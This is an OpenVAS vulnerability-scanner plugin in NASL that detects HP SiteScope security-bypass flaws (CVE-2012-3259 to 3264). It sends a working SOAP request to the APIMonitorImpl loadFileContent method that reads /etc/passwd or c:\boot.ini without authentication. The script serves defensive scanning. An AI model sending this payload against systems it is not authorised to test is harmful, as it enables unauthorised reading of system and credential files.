###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sitescope_55269.nasl 12 2013-10-27 11:15:33Z jan $
#
# HP SiteScope Multiple Security Bypass Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "HP SiteScope is prone to multiple security-bypass vulnerabilities.

Successful exploits may allow attackers to bypass the bypass security
restrictions and to perform unauthorized actions such as execution of
arbitrary code in the context of the application.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103560";

if (description)
{
 script_oid(SCRIPT_OID);
 script_cve_id("CVE-2012-3259", "CVE-2012-3260", "CVE-2012-3261", "CVE-2012-3262",
               "CVE-2012-3263", "CVE-2012-3264");
 script_bugtraq_id(55269,55273);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("HP SiteScope Multiple Security Bypass Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55269");
 script_xref(name : "URL" , value : "http://www.hp.com/");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-09-07 17:11:57 +0200 (Fri, 07 Sep 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to retrieve a local file.");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8080);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

url = '/SiteScope/';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("Server: SiteScope" >!< buf && "<TITLE>Login - SiteScope" >!< buf && "<small>SiteScope" >!< buf)exit(0);

host = get_host_name();

files =  make_array("root:.*:0:[01]:","/etc/passwd","\[boot loader\]","c:\\boot.ini");

foreach file(keys(files)) {

  soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
                "<wsns0:Envelope\r\n",
                "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
                "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
                ">\r\n",
                "<wsns0:Body\r\n",
                "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
                ">\r\n",
                "<impl:loadFileContent\r\n",
                "xmlns:impl='http://Api.freshtech.COM'\r\n",
                ">\r\n",
                "<in0\r\n",
                "xsi:type='xsd:string'\r\n",
                "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
                ">",files[file],"</in0>\r\n",
                "</impl:loadFileContent>\r\n",
                "</wsns0:Body>\r\n",
                "</wsns0:Envelope>\r\n");

  len = strlen(soap);

  req = string("POST /SiteScope/services/APIMonitorImpl HTTP/1.1\r\n",
               "Host: ",port,"\r\n",
               "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n",
               'SOAPAction: ""',"\r\n",
               "Content-Type: text/xml; charset=UTF-8\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
                soap);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(string:result,pattern:file)) {

    security_hole(port:port);
    exit(0); 

  }
}
exit(0);
